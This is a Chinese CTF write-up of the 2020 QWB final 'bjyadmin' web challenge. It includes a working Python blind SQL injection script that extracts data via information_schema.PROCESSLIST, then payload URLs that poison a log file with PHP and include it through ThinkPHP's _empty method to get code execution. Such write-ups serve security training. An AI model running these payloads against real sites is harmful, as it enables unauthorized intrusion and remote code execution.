date: 2020-09-21
categories:
- 比赛
tags:
- wp
- web
- ctf
title: 2020-QWB-final-bjyadmin
---
# 2020-QWB-final-bjyadmin

## 第一步sql注入

>选手使用攻击机利用靶机中的sql注入漏洞获取bjyadmin框架路径

```
# mysql> select info from PROCESSLIST;
# +------------------------------+
# | info                         |
# +------------------------------+
# | select info from PROCESSLIST |
# +------------------------------+
# 1 row in set (0.00 sec)
```

利用processlist注出字段名，[相关的介绍](https://dev.mysql.com/doc/refman/8.0/en/performance-schema-processlist-table.html)

```python
import requests
import time
ip="192.168.10.110"
#http://101.133.129.243/
def inj(pos,guess):
    # true: real-guess < 0
    # false : guess <= real
    burp0_url = "http://"+ip+"/?id=1'/(if(floor((SELECT(ord(right(left(group_concat(info),{POS}),1)))FROM(information_schema.PROCESSLIST))/{GUESS}),1,0))/'1".format(POS=pos,GUESS=guess)
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
    r=requests.get(burp0_url, headers=burp0_headers,proxies={"http":"http://127.0.0.1:8080"})

    if "Undefined variable: rows in" in r.text:
        return True
    return False
# "http://101.133.129.243:80/?id=1'/(if(floor((SELECT(ord(right(left(group_concat(schema_name),{POS}),1)))FROM(information_schema.schemata))/{GUESS}),1,0))/'1"
# database:2020qwbctf 
# table_name:
result=""
pos=len(result)+1
while True:
    min=32
    max=128
    print(result)
    while True:
        #time.sleep(1)
        
        avr = int((min+max)/2)
        print(avr)
        if not inj(pos,avr):
            if inj(pos,avr+1):
                result+=chr(avr)
                break
            else:
                min=avr
        else:
            max=avr
        if max-min == 1:
            if not inj(pos,min):
                result+=chr(max)
                
            else:
                result+=chr(min)
            break


    
    pos+=1
```



## bjyadmin

题目提供的附件和

https://github.com/baijunyao/thinkphp-bjyadmin

一摸一样

![image2362](https://raw.githubusercontent.com/Explorersss/photo/master/20200921120236.png)

挨个看过去发现有一个容易令人忽略的漏洞（sxgg一眼看出来）



```php
<?php
namespace Home\Controller;
use Common\Controller\HomeBaseController;
/**
 * Vue示例
 */
class VueController extends HomeBaseController{

    /**
     * 拦截空方法 自动加载html
     * @param  string $methed_name 空方法
     */
    public function _empty($methed_name){
        $this->display($methed_name);
        exit(0);
    }

    /**
     * 配合thinkphp分页示例
     */
    public function page(){
        // 获取总条数
        $count=M('Province_city_area')->count();
        // 每页多少条数据
        $limit=200;
        $page=new \Org\Nx\Page($count,$limit);
        $data=M('Province_city_area')
            ->limit($page->firstRow.','.$page->listRows)
            ->select();
        echo json_encode($data);
    }

}
```



># ThinkPHP Action中的_empty方法
>
>_empty方法即空操作，当找不到请求的方法时，默认执行该方法，利用这个机制，我们可以实现错误页面和一些URL的优化。
>
>```
>public function _empty($name)
>{
>    echo $name;
>}
>```
>
>参数name,即请求的方法名。如http://localhost/waimai/index.php/Index/sdfewsdf,不存在sdfewsdf方法时，会调用_empty方法，显示sdfewsdf.



当我们调用一个不存在的action时，它会`display ($method) ` ，这将会造成任意模板调用

我们利用`index.php?m=Home&c=Vue&a=evil_path`来调用任意模板，我们可以利用日志文件作为模板文件从而RCE



最后的payload:

```
index.php/Home.php?m=Home&c=Vue&a=Runtime/Logs/User/20_09_17.log
index.php/Home/Vue/web_page&content=<?php/**/phpinfo();
```

